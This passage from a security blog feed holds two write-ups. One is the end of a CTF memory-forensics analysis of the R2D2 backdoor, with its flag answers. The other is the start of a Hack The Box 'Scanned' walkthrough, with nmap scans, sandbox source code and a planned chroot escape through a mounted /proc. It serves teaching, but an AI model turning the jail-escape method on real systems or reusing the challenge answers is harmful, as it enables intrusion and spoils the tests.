the md5sum of the .vmem file. This was as easy as:‚ûú  md5sum malware.vmemcb47af710c7ab59e43d1396aa7ce950c  malware.vmemMoving on, we can use a tool like volatility to analyze the memory dump.Other tools you can explore on memory forensics include:  Rekall Framework  RedlineFirst, you need to find more information about the dump you are analying such as the image profile to use. To do so, you can use the imageinfo plugin or kdbgscan.‚ûú  python2 vol.py -f malware.vmem imageinfoVolatility Foundation Volatility Framework 2.6.1INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)                     AS Layer2 : FileAddressSpace (/home/kali/Desktop/CyberCON/malware.vmem)                      PAE type : PAE                           DTB : 0x319000L                          KDBG : 0x80544ce0L          Number of Processors : 1     Image Type (Service Pack) : 2                KPCR for CPU 0 : 0xffdff000L             KUSER_SHARED_DATA : 0xffdf0000L           Image date and time : 2011-10-10 17:06:54 UTC+0000     Image local date and time : 2011-10-10 13:06:54 -0400With that determined, you can begin investigating the processes running on the target system by using the pslist plugin.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0x819cc830 System                    4      0     55      162 ------      00x81945020 smss.exe                536      4      3       21 ------      0 2011-10-10 17:03:56 UTC+00000x816c6020 csrss.exe               608    536     11      355      0      0 2011-10-10 17:03:58 UTC+00000x813a9020 winlogon.exe            632    536     24      533      0      0 2011-10-10 17:03:58 UTC+00000x816da020 services.exe            676    632     16      261      0      0 2011-10-10 17:03:58 UTC+00000x813c4020 lsass.exe               688    632     23      336      0      0 2011-10-10 17:03:58 UTC+00000x81772ca8 vmacthlp.exe            832    676      1       24      0      0 2011-10-10 17:03:59 UTC+00000x8167e9d0 svchost.exe             848    676     20      194      0      0 2011-10-10 17:03:59 UTC+00000x817757f0 svchost.exe             916    676      9      217      0      0 2011-10-10 17:03:59 UTC+00000x816c6da0 svchost.exe             964    676     63     1058      0      0 2011-10-10 17:03:59 UTC+00000x815daca8 svchost.exe            1020    676      5       58      0      0 2011-10-10 17:03:59 UTC+00000x813aeda0 svchost.exe            1148    676     12      187      0      0 2011-10-10 17:04:00 UTC+00000x817937e0 spoolsv.exe            1260    676     13      140      0      0 2011-10-10 17:04:00 UTC+00000x81754990 VMwareService.e        1444    676      3      145      0      0 2011-10-10 17:04:00 UTC+00000x8136c5a0 alg.exe                1616    676      7       99      0      0 2011-10-10 17:04:01 UTC+00000x815c4da0 wscntfy.exe            1920    964      1       27      0      0 2011-10-10 17:04:39 UTC+00000x813bcda0 explorer.exe           1956   1884     18      322      0      0 2011-10-10 17:04:39 UTC+00000x816d63d0 VMwareTray.exe          184   1956      1       28      0      0 2011-10-10 17:04:41 UTC+00000x8180b478 VMwareUser.exe          192   1956      6       83      0      0 2011-10-10 17:04:41 UTC+00000x818233c8 reader_sl.exe           228   1956      2       26      0      0 2011-10-10 17:04:41 UTC+00000x815e7be0 wuauclt.exe             400    964      8      173      0      0 2011-10-10 17:04:46 UTC+00000x817a34b0 cmd.exe                 544   1956      1       30      0      0 2011-10-10 17:06:42 UTC+0000No process looks suspicious at this point. We can take this a notch higher and use the pstree plugin to print process list as a tree. This would make you understand which process triggered other processes.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.6.1Name                                                  Pid   PPid   Thds   Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x819cc830:System                                      4      0     55    162 1970-01-01 00:00:00 UTC+0000. 0x81945020:smss.exe                                 536      4      3     21 2011-10-10 17:03:56 UTC+0000.. 0x816c6020:csrss.exe                               608    536     11    355 2011-10-10 17:03:58 UTC+0000.. 0x813a9020:winlogon.exe                            632    536     24    533 2011-10-10 17:03:58 UTC+0000... 0x816da020:services.exe                           676    632     16    261 2011-10-10 17:03:58 UTC+0000.... 0x817757f0:svchost.exe                           916    676      9    217 2011-10-10 17:03:59 UTC+0000.... 0x81772ca8:vmacthlp.exe                          832    676      1     24 2011-10-10 17:03:59 UTC+0000.... 0x816c6da0:svchost.exe                           964    676     63   1058 2011-10-10 17:03:59 UTC+0000..... 0x815c4da0:wscntfy.exe                         1920    964      1     27 2011-10-10 17:04:39 UTC+0000..... 0x815e7be0:wuauclt.exe                          400    964      8    173 2011-10-10 17:04:46 UTC+0000.... 0x8167e9d0:svchost.exe                           848    676     20    194 2011-10-10 17:03:59 UTC+0000.... 0x81754990:VMwareService.e                      1444    676      3    145 2011-10-10 17:04:00 UTC+0000.... 0x8136c5a0:alg.exe                              1616    676      7     99 2011-10-10 17:04:01 UTC+0000.... 0x813aeda0:svchost.exe                          1148    676     12    187 2011-10-10 17:04:00 UTC+0000.... 0x817937e0:spoolsv.exe                          1260    676     13    140 2011-10-10 17:04:00 UTC+0000.... 0x815daca8:svchost.exe                          1020    676      5     58 2011-10-10 17:03:59 UTC+0000... 0x813c4020:lsass.exe                              688    632     23    336 2011-10-10 17:03:58 UTC+0000 0x813bcda0:explorer.exe                             1956   1884     18    322 2011-10-10 17:04:39 UTC+0000. 0x8180b478:VMwareUser.exe                           192   1956      6     83 2011-10-10 17:04:41 UTC+0000. 0x817a34b0:cmd.exe                                  544   1956      1     30 2011-10-10 17:06:42 UTC+0000. 0x816d63d0:VMwareTray.exe                           184   1956      1     28 2011-10-10 17:04:41 UTC+0000. 0x818233c8:reader_sl.exe                            228   1956      2     26 2011-10-10 17:04:41 UTC+0000At this point we see explorer.exe (PID: 1956) spawning VMwareUser.exe , cmd.exe ( Suspicious) , VMwareTray.exe &amp; reader_sl.exe ( Suspicious). My thinking, The user probably opened a malicious pdf file that spawned cmd and finally Adobe reader to view it. We can use the cmdscan plugin to extract command history as shown:‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 cmdscanVolatility Foundation Volatility Framework 2.6.1**************************************************CommandProcess: csrss.exe Pid: 608CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 @ 0x4e1eb8: sc query malwarCmd #1 @ 0x11135e8: sc query malwareWe see sc query malware command was executed.  The sc command is used to configure, query, stop, start, delete, and add system services on the Windows command line.In our case, the command seems to be querying a service called malware. The first command entry looks like a typo though.Similar to cmdscan the consoles plugin finds commands that attackers typed into cmd.exe or executed via backdoors. The major advantage to this plugin is it not only prints the commands attackers typed, but it collects the entire screen buffer (input and output). For instance, lets see what output was generated when sc query malware command was executed.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 consolesVolatility Foundation Volatility Framework 2.6.1**************************************************ConsoleProcess: csrss.exe Pid: 608Console: 0x4e2370 CommandHistorySize: 50HistoryBufferCount: 2 HistoryBufferMax: 4OriginalTitle: %SystemRoot%\\system32\\cmd.exeTitle: C:\\WINDOWS\\system32\\cmd.exeAttachedProcess: cmd.exe Pid: 544 Handle: 0x4c4----CommandHistory: 0x1113498 Application: sc.exe Flags:CommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x0----CommandHistory: 0x11132d8 Application: cmd.exe Flags: Allocated, ResetCommandCount: 2 LastAdded: 1 LastDisplayed: 1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x4c4Cmd #0 at 0x4e1eb8: sc query malwarCmd #1 at 0x11135e8: sc query malware----Screen 0x4e2a70 X:80 Y:300Dump:Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.C:\\Documents and Settings\\Administrator&gt;sc query malwar[SC] EnumQueryServicesStatus:OpenService FAILED 1060:The specified service does not exist as an installed service.C:\\Documents and Settings\\Administrator&gt;sc query malwareSERVICE_NAME: malware        TYPE               : 1  KERNEL_DRIVER        STATE              : 4  RUNNING                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)        WIN32_EXIT_CODE    : 0  (0x0)        SERVICE_EXIT_CODE  : 0  (0x0)        CHECKPOINT         : 0x0        WAIT_HINT          : 0x0C:\\Documents and Settings\\Administrator&gt;More information about the service can be queried using the svcscan plugin. This plugin gives more detail to the running processes in the event that the analyst requires additional details such as the display name, binary path, or service type.We see that the service is running. Next thing we can try establish if there were network connections. Using connscan plugin, we see‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 connscanVolatility Foundation Volatility Framework 2.6.1Offset(P)  Local Address             Remote Address            Pid---------- ------------------------- ------------------------- ---0x01a25a50 0.0.0.0:1026              172.16.98.1:6666          1956We can detect listening sockets for any protocol (TCP, UDP, RAW, etc), using the sockets plugin.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 socketsVolatility Foundation Volatility Framework 2.6.1Offset(V)       PID   Port  Proto Protocol        Address         Create Time---------- -------- ------ ------ --------------- --------------- -----------0x8177e3c0     1956   1026      6 TCP             0.0.0.0         2011-10-10 17:04:39 UTC+00000x81596a78      688    500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x8166a008      964   1029     17 UDP             127.0.0.1       2011-10-10 17:04:42 UTC+00000x818ddc08        4    445      6 TCP             0.0.0.0         2011-10-10 17:03:55 UTC+00000x818328d8      916    135      6 TCP             0.0.0.0         2011-10-10 17:03:59 UTC+00000x81687e98     1616   1025      6 TCP             127.0.0.1       2011-10-10 17:04:01 UTC+00000x817517e8      964    123     17 UDP             127.0.0.1       2011-10-10 17:04:00 UTC+00000x81753b20      688      0    255 Reserved        0.0.0.0         2011-10-10 17:04:00 UTC+00000x8174fe98     1148   1900     17 UDP             127.0.0.1       2011-10-10 17:04:41 UTC+00000x81753008      688   4500     17 UDP             0.0.0.0         2011-10-10 17:04:00 UTC+00000x816118d8        4    445     17 UDP             0.0.0.0         2011-10-10 17:03:55 UTC+0000Moving on, there was a question asking about the computer name and OS version. This information can be found using the envars plugin. Typically this will show the number of CPUs installed and the hardware architecture (though the kdbgscan output is a much more reliable source), the process‚Äôs current directory, temporary directory, session name, computer name, user name, and various other interesting artifacts.But what really triggered PID 1956? My hypothesis was that the user opened suspicious PDF documents that led to cmd &amp; Adobe reader spawning. We also saw a network connection linked to this process. Using the iehistory plugin we can recover fragments of IE history index.dat cache files. It can find basic accessed links (via FTP or HTTP), redirected links (‚ÄìREDR), and deleted entries (‚ÄìLEAK). It applies to any process which loads and uses the wininet.dll library, not just Internet Explorer. Typically that includes Windows Explorer and even malware samples. For more info about the same, you can read this blog postFrom the above, we see two suspicious pdf documents linked to the same process: listener.pdf &amp; Exploit.pdfLets scan for malicious drivers loaded, and moreso any that contains the malware string or name.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 driverscan | grep \"malware\"Volatility Foundation Volatility Framework 2.6.1Offset(P)          #Ptr #Hnd Start                            Size Service Key          Name         Driver Name------------------ ---- ---- ------------------ ------------------ -------------------- ------------ -----------0x0000000001a498b8        3        0 0xf9eb4000     0x1500 malware              malware      \\Driver\\malwareTo extract a kernel driver to a file, use the moddump pluggin. Supply the output directory with -D or ‚Äìdump-dir=DIR.‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0xf9eb4000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x0f9eb4000 winsys32.sys         OK: driver.f9eb4000.sysWe can get its md5sum and check if its flagged by VT‚ûú  md5sum driver.f9eb4000.sys63270d2354695cabde0baeb0aed60e2a  driver.f9eb4000.sysFrom the VT - driver.f9eb4000.sys Analysis, we find 53/71 vendors flagged this file as malicious. We also learn that it linked with R2D2 backdoor.Running strings on the malicious driver, we find another interesting dll referenced. Doing a quick google search on the same, we still get hits on R2D2 backdoor.Lets find out if the dll is used by explorer.exe. To display a process‚Äôs loaded DLLs, use the dlllist plugin with the -p or --pid filter as shown below.From the output shown above, we see mfc42ul.dll has a wierd base address compared to the rest (0x10000000). What we can do is extract the DLL from the process‚Äôs memory space and dump it to disk for analysis as shown below:‚ûú  python2 vol.py -f malware.vmem --profile=WinXPSP2x86 moddump -b 0x10000000 --dump-dir=$PWDVolatility Foundation Volatility Framework 2.6.1Module Base Module Name          Result----------- -------------------- ------0x010000000 UNKNOWN              OK: driver.10000000.sys‚ûú  md5sum driver.10000000.sys4986f678160ccd516f2bd589719ea0c4  driver.10000000.sysDoing a quick check on VirusTotal, we see 46/68 flagged this file as malicious.I did some research on this backdoor and came across this report by the Chaos Computer Club (CCC), a long-established German hacker group that claimed that the German government may have unleashed a backdoor Trojan Horse program, allowing them to spy on its people. While running strings on the suspicious dll (mfc42ul.dll), i noticed some wierd string, C3PO-r2d2-POE. Starwars characters? I don‚Äôt know.From CCC‚Äôs report, i learnt that the backdoor was dubbed ‚ÄúR2D2‚Äù due to the ‚ÄúC3PO-r2d2-POE‚Äù string located inside the Trojan. CCC claims that it allows the monitoring Internet activity, including the recording of MSN Messenger conversations, Skype calls and Yahoo messenger chat.That wraps up my analysis of the R2D2 backdoor, atleast for the context of the CTF. Upon completion of my analysis, I stumbled upon several blog posts documenting analysis of the same sample. Please check them out!  Invoke-IR - R2D2 Memory Sample Analysis   ka1d0 - Analyzing Memory Dumps ‚Äî R2D2 Malware  Skills that matter - Hunting R2D2 Malware  evild3ad - Federal Trojan aka R2D2If anyone has additional details that i might have missed, or has any feedback to improve my methodology it would be greatly appreciated.Questions  What is the md5sum of the memory sample (50pts)ccke{cb47af710c7ab59e43d1396aa7ce950c}  What is the computer name of the machine captured (50pts)ccke{GENERALLEE}  What is the name of the OS from which the memory sample was captured from? (50pts)ccke{Windows_NT}  What process triggered a series of suspicious processes? (50pts)ccke{1956}  What Remote Address and Port was the victim machine communicating with? (50pts)ccke{172.16.98.1:6666}  There are two suspicious PDFs that were likely opened. Can you find their names? (50pts)ccke{listener.pdf,Exploit.pdf}  What is the md5sum of the malicious dll? (300pts)ccke{4986f678160ccd516f2bd589719ea0c4}  What is the md5sum of the malicious driver? (300pts)ccke{63270d2354695cabde0baeb0aed60e2a}  What is the name of this backdoor? (100pts)ccke{R2D2} or ccke{r2d2}"
  },
  
  {
    "title": "Hack The Box - Scanned",
    "url": "/posts/scanned/",
    "categories": "HackTheBox",
    "tags": "linux, insane, kernel, pwn, c, coding, chroot, jail, sandbox",
    "date": "2022-09-10 00:00:00 +0800",
    





    
    "snippet": "Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reuse...",
    "content": "Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reused credentials. To obtain root we will again fiddle with the chroot jail binary to call a suid binary using a backdored library and thus getting code execution as the root user.UserAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.All Ports$ sudo nmap -n -p- -T4 10.129.159.163Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 18:34 CETNmap scan report for 10.129.159.163Host is up (0.034s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 100.45 secondsScript and version$ sudo nmap -sC -sV -p22,80 -n 10.129.159.163Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 18:38 CETNmap scan report for 10.129.159.163Host is up (0.034s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)| ssh-hostkey:|   3072 6a:7b:14:68:97:01:4a:08:6a:e1:37:b1:d2:bd:8f:3f (RSA)|   256 f6:b4:e1:10:f0:7b:38:48:66:34:c2:c6:28:ff:b8:25 (ECDSA)|_  256 c9:8b:96:19:51:e7:ce:1f:7d:3e:44:e9:a4:04:91:09 (ED25519)80/tcp open  http    nginx 1.18.0|_http-title: Malware Scanner|_http-server-header: nginx/1.18.0Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.00 secondsThere are only two ports open on the machine with nginx running on port 80 seeming most promising for initial access. Opening the page in our browser we see an application that offers to scan malware in a chroot jail.The first link on the page http://10.129.159.163/scanner/upload leads to the upload form where we can submit a binary for scanning.The other link http://10.129.159.163/static/source.tar.gz let‚Äôs us download a source tar archive.The archive looks interesting so let‚Äôs download and unpack it.$ tar -xvf source.tar.gzmalscanner/malscanner/.gitignoremalscanner/malscanner/malscanner/malscanner.dbmalscanner/malscanner/__init__.pymalscanner/malscanner/__pycache__/malscanner/malscanner/__pycache__/__init__.cpython-39.pycmalscanner/malscanner/__pycache__/settings.cpython-39.pycmalscanner/malscanner/__pycache__/urls.cpython-39.pycmalscanner/malscanner/__pycache__/views.cpython-39.pycmalscanner/malscanner/__pycache__/wsgi.cpython-39.pycmalscanner/malscanner/asgi.pymalscanner/malscanner/settings.pymalscanner/malscanner/urls.pymalscanner/malscanner/views.pymalscanner/malscanner/wsgi.pymalscanner/manage.pymalscanner/requirements.txtmalscanner/sandbox/malscanner/sandbox/jails/malscanner/sandbox/sandboxmalscanner/scanner/malscanner/scanner/__init__.pymalscanner/scanner/__pycache__/malscanner/scanner/__pycache__/__init__.cpython-39.pycmalscanner/scanner/__pycache__/forms.cpython-39.pycmalscanner/scanner/__pycache__/urls.cpython-39.pycmalscanner/scanner/__pycache__/views.cpython-39.pycmalscanner/scanner/admin.pymalscanner/scanner/apps.pymalscanner/scanner/forms.pymalscanner/scanner/tests.pymalscanner/scanner/urls.pymalscanner/scanner/views.pymalscanner/static/malscanner/static/source.tar.gzmalscanner/templates/malscanner/templates/index.htmlmalscanner/templates/upload.htmlmalscanner/templates/view.htmlmalscanner/uploads/malscanner/uwsgi_paramsmalscanner/viewer/malscanner/viewer/__init__.pymalscanner/viewer/__pycache__/malscanner/viewer/__pycache__/__init__.cpython-39.pycmalscanner/viewer/__pycache__/syscalls.cpython-39.pycmalscanner/viewer/__pycache__/urls.cpython-39.pycmalscanner/viewer/__pycache__/views.cpython-39.pycmalscanner/viewer/admin.pymalscanner/viewer/apps.pymalscanner/viewer/syscalls.pymalscanner/viewer/tests.pymalscanner/viewer/urls.pymalscanner/viewer/views.pysandbox/sandbox/.gitignoresandbox/Makefilesandbox/copy.csandbox/jails/sandbox/sandbox.csandbox/tracing.cLooking at the source code of the upload form we see what happens with our uploaded binary.  First it generates a md5 hash of our uploaded file writes it to disk and runs it with a  sandbox executable.malscanner/scanner/views.pyfrom django.http import HttpResponse, HttpResponseRedirectfrom django.shortcuts import renderfrom django.conf import settingsfrom django_file_md5 import calculate_file_md5from .forms import UploadFileFormimport osdef index(request):    return HttpResponse(\"Hello, world. You're at the polls index.\")def upload_file(request):    if request.method == 'POST':        form = UploadFileForm(request.POST, request.FILES)        if form.is_valid():            md5 = handle_file(request.FILES['file'])            return HttpResponseRedirect(f'/viewer/{md5}')        else:            return HttpResponse(\"Invalid form\")    else:        return render(request, 'upload.html', {'form': UploadFileForm()})def handle_file(file):    md5 = calculate_file_md5(file)    path = f\"{settings.FILE_PATH}/{md5}\"    with open(path, 'wb+') as f:        for chunk in file.chunks():            f.write(chunk)    os.system(f\"cd {settings.SBX_PATH}; ./sandbox {path} {md5}\")    os.remove(path)    return md5The viewer seems to return some syscalls that happened during execution.malscanner/viewer/views.pyfrom django.shortcuts import renderfrom django.conf import settingsfrom django.http import Http404, HttpResponsefrom .syscalls import LoggedSyscall, SyscallClassimport os.pathimport structdef view_file(request, md5: str):    path = f\"{settings.SBX_PATH}/jails/{md5}\"    if not os.path.exists(path):        raise Http404(\"A sample with this hash has not been uploaded.\")    logfile = f\"{path}/log\"    if not os.path.exists(logfile):        return HttpResponse(\"There was an error logging this application\")    syscalls = [call.render() for call in parse_log(logfile)]    ignore = list(filter(lambda call: call[0] == SyscallClass.Ignore, syscalls))    low = list(filter(lambda call: call[0] == SyscallClass.Low, syscalls))    med = list(filter(lambda call: call[0] == SyscallClass.Medium, syscalls))    high = list(filter(lambda call: call[0] == SyscallClass.High, syscalls))    render_vars = {\"md5\": md5, \"ignore\": ignore, \"low\": low, \"med\": med, \"high\": high}    return render(request, 'view.html', render_vars)def parse_log(path):    syscalls = []    with open(path, 'rb') as f:        chunk = f.read(8 * 8)        nums = struct.unpack(\"q\" * 8, chunk)        while len(chunk) == 8*8:            nums = struct.unpack(\"q\" * 8, chunk)            call = LoggedSyscall(nums)            syscalls.append(call)            chunk = f.read(8 * 8)    return syscallsmalscanner/viewer/syscalls.pyIn the source.tar.gz the code for sandbox is also included.find .../.gitignore./Makefile./tracing.c./sandbox.c./jails./copy.cLooking at the Makefile we see it creates the jails directory upon building. Furthermore the finished binary get‚Äôs the cap_setuid capability set which looks very promising in a successful exploit scenario.Makefile.PHONY: all cleanall: sandboxjails:\tmkdir jails; chmod 0771 jailssandbox: jails sandbox.c copy.c tracing.c\tgcc sandbox.c copy.c tracing.c -static -o sandbox\tsudo setcap 'cap_setpcap,cap_sys_admin,cap_setuid,cap_setgid,cap_sys_chroot=+eip' ./sandboxclean:\tfor i in $(shell find jails -maxdepth 2 -name proc); do sudo umount $$i; done\trm -rf sandbox jails/*Going through the source code we start in the main function of the program. The binary expects at least one argument else it exits and the argument has to start with /.  The flow continues by calling the check_cap() function.sandbox.c/mainint main(int argc, char** argv) {    if (argc &lt; 2) {        printf(\"Usage: %s &lt;program&gt; [uuid]\\n\", argv[0]);        exit(-2);    }    if (strlen(argv[1]) &gt; FILENAME_MAX - 50) {        DIE(\"Program name too long\");    }    if ((argv[1][0]) != '/') {        DIE(\"Program path must be absolute\");    }    umask(0);    check_caps();    int result = mkdir(\"jails\", 0771);    if (result == -1 &amp;&amp; errno != EEXIST) {        DIE( \"Could not create jail directory\");    }    char uuid[33] = {0};    if (argc &lt; 3) {        generate_uuid(uuid);    } else {        memcpy(uuid, argv[2], 32);    }    uuid[32] = 0;    make_jail(uuid, argv[1]);}Inside the function the current capabilities of the process are retrieved and if they aren‚Äôt sufficient to pass the check the program exits. Since we cannot change the capabilities on the remote binary unless we have root access this check is irrelevant for us unless building the binary ourselves.sandbox.c/check_capsstruct user_cap_header_struct {    int version;    pid_t pid;};struct user_cap_data_struct {    unsigned int effective;    unsigned int permitted;    unsigned int inheritable;};int copy(const char* src, const char* dst);void do_trace();int jailsfd = -1;#define DIE(err) fprintf(stderr, err \": (%d)\\n\", errno); exit(-1)...[snip]...// Check we have all required capabilitiesvoid check_caps() {    struct user_cap_header_struct header;    struct user_cap_data_struct caps;    char pad[32];    header.version = _LINUX_CAPABILITY_VERSION_3;    header.pid = 0;    caps.effective = caps.inheritable = caps.permitted = 0;    syscall(SYS_capget, &amp;header, &amp;caps);    if (!(caps.effective &amp; 0x2401c0)) {        DIE(\"Insufficient capabilities\");    }}Next up in main a uuid is generated if no second argument is passed which would in turn take the place of the uuid.sandbox.c/generate_uuidvoid generate_uuid(char* buf) {    srand(time(0));    for (int i = 0; i &lt; 32; i+=2) {        sprintf(&amp;buf[i], \"%02hhx\", (char)(rand() % 255));    }}Before the program ends the make_jail function is called in main. First it checks if a file with the name of the uuid already exists in the jails directory, exits if it does and elses create a directory with the uuid as name. Afterwards it switches to the dirctory and calls copy_libs.sandbox.c/make_jailvoid make_jail(char* name, char* program) {    jailsfd = open(\"jails\", O_RDONLY|__O_DIRECTORY);    if (faccessat(jailsfd, name, F_OK, 0) == 0) {        DIE(\"Jail name exists\");    }    int result = mkdirat(jailsfd, name, 0771);    if (result == -1 &amp;&amp; errno != EEXIST) {        DIE( \"Could not create the jail\");    }    if (access(program, F_OK) != 0) {        DIE(\"Program does not exist\");    }    chdir(\"jails\");    chdir(name);    copy_libs();    do_namespaces();    copy(program, \"./userprog\");    if (chroot(\".\")) {DIE(\"Couldn't chroot #1\");}    if (setgid(1001)) {DIE(\"SGID\");}    if (setegid(1001)) {DIE(\"SEGID\");}    if (setuid(1001)) {DIE(\"SUID\");};    if (seteuid(1001)) {DIE(\"SEUID\");};    do_trace();    sleep(3);}Here a bin , usr/lib/x86_64-linux-gnu and  usr/lib64 directory get created. Next copy gets called to copy the the library and afterwards two symlinks are created for lib64 and lib respectively.sandbox.c/copy_libsvoid copy_libs() {    char* libs[] = {\"libc.so.6\", NULL};    char path[FILENAME_MAX] = {0};    char outpath[FILENAME_MAX] = {0};    system(\"mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin\");    for (int i = 0; libs[i] != NULL; i++) {        sprintf(path, \"/lib/x86_64-linux-gnu/%s\", libs[i]);        // sprintf(path, \"/lib/%s\", libs[i]);        sprintf(outpath, \"./usr/lib/%s\", libs[i]);        copy(path, outpath);    }    copy(\"/lib64/ld-linux-x86-64.so.2\", \"./usr/lib64/ld-linux-x86-64.so.2\");    system(\"ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin\");}Inside copy the actual copying of the library happens.copy.c// https://stackoverflow.com/questions/2180079/how-can-i-copy-a-file-on-unix-using-c#define _GNU_SOURCE#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;/* On versions of glibc &lt; 2.27, need to use syscall. * * To determine glibc version used by gcc, compute an integer representing the * version. The strides are chosen to allow enough space for two-digit * minor version and patch level. * */#define GCC_VERSION (__GNUC__*10000 + __GNUC_MINOR__*100 + __gnuc_patchlevel__)#if GCC_VERSION &lt; 22700static loff_t copy_file_range(int in, loff_t* off_in, int out,  loff_t* off_out, size_t s, unsigned int flags){  return syscall(__NR_copy_file_range, in, off_in, out, off_out, s,    flags);}#endifint copy(const char* src, const char* dst) {    int in, out;    struct stat stat;    loff_t s, n;    if(0&gt;(in = open(src, O_RDONLY))){        perror(\"open(src, ...)\");        exit(EXIT_FAILURE);    }    if(fstat(in, &amp;stat)){        perror(\"fstat(in, ...)\");        exit(EXIT_FAILURE);    }    s = stat.st_size;    if(0&gt;(out = open(dst, O_CREAT|O_WRONLY|O_TRUNC, 0777))){        perror(\"open(dst, ...)\");        exit(EXIT_FAILURE);    }    do{        if(1&gt;(n = copy_file_range(in, NULL, out, NULL, s, 0))){            perror(\"copy_file_range(...)\");            exit(EXIT_FAILURE);        }        s-=n;    }while(0&lt;s &amp;&amp; 0&lt;n);    close(in);    close(out);    return EXIT_SUCCESS;}Continuing with the execution flow in make_jail, do_namespaces is called next. This function creates a new namespace and unshares the pid and network space from the original namespace. Furthermore here a timer get‚Äôs set for the parent to exit after 6 seconds. Afterwards a /proc dirctory is created in ./jails/[uuid] and the actual /proc directory is mounted on top of it.sandbox.c/do_namespacesvoid do_namespaces() {    if (unshare(CLONE_NEWPID|CLONE_NEWNET) != 0) {DIE(\"Couldn't make namespaces\");};    // Create pid-1    if (fork() != 0) {sleep(6); exit(-1);}    mkdir(\"./proc\", 0555);    mount(\"/proc\", \"./proc\", \"proc\", 0, NULL);}After do_namespaces copy is called again to move the uploaded binary inside the chroot jail and the uid‚Äôs are set to 1001. Last up in make_jail, do_trace gets called. This function first drops the effective and permitted capabilities. Afterwards a child process is started which is killed after 5 seconds by another forked process which exits itself afterwards.sandbox.c/do_tracevoid do_trace() {    // We started with capabilities - we must reset the dumpable flag    // so that the child can be traced    prctl(PR_SET_DUMPABLE, 1, 0, 0, 0, 0);    // Remove dangerous capabilities before the child starts    struct user_cap_header_struct header;    struct user_cap_data_struct caps;    char pad[32];    header.version = _LINUX_CAPABILITY_VERSION_3;    header.pid = 0;    caps.effective = caps.inheritable = caps.permitted = 0;    syscall(SYS_capget, &amp;header, &amp;caps);    caps.effective = 0;    caps.permitted = 0;    syscall(SYS_capset, &amp;header, &amp;caps);    int child = fork();    if (child == -1) {        DIE(\"Couldn't fork\");    }    if (child == 0) {        do_child();    }    int killer = fork();    if (killer == -1) {        DIE(\"Couldn't fork (2)\");    }    if (killer == 0) {        do_killer(child);    } else {        do_log(child);    }}Inside do_child the jailsfd is closed to lock the forked process inside ./jails/[uuid]. The interesting thing here is though that /proc is mounted inside the chroot jail and still provides means of accessing the rest of the filesystem.sandbox.c/do_childvoid do_child() {    // Prevent child process from escaping chroot    close(jailsfd);    prctl(PR_SET_PDEATHSIG, SIGHUP);    ptrace(PTRACE_TRACEME, 0, NULL, NULL);    char* args[] = {NULL};    execve(\"/userprog\", args, NULL);    DIE(\"Couldn't execute user program\");}After do_child a ‚Äúkiller‚Äù process is forked in do_killer which sleeps for 5 seconds, kills the do_child process and then exits.sandbox.c/do_killervoid do_killer(int pid) {    sleep(5);    if (kill(pid, SIGKILL) == -1) {DIE(\"Kill err\");}    puts(\"Killed subprocess\");    exit(0);}In do_log all the syscalls and their results are traced and passed to log_syscall.sandbox.c/do_logvoid do_log(int pid) {    int status;    waitpid(pid, &amp;status, 0);    struct user_regs_struct regs;    struct user_regs_struct regs2;    while (1) {        // Enter syscall        ptrace(PTRACE_SYSCALL, pid, 0, 0);        waitpid(pid, &amp;status, 0);        if (WIFEXITED(status) || WIFSIGNALED(status)) {            puts(\"Exited\");            return;        }        ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);        // Continue syscall        ptrace(PTRACE_SYSCALL, pid, 0, 0);        waitpid(pid, &amp;status, 0);        ptrace(PTRACE_GETREGS, pid, 0, &amp;regs2);        log_syscall(regs, regs2.rax);    }}typedef struct __attribute__((__packed__)) {    unsigned long rax;    unsigned long rdi;    unsigned long rsi;    unsigned long rdx;    unsigned long r10;    unsigned long r8;   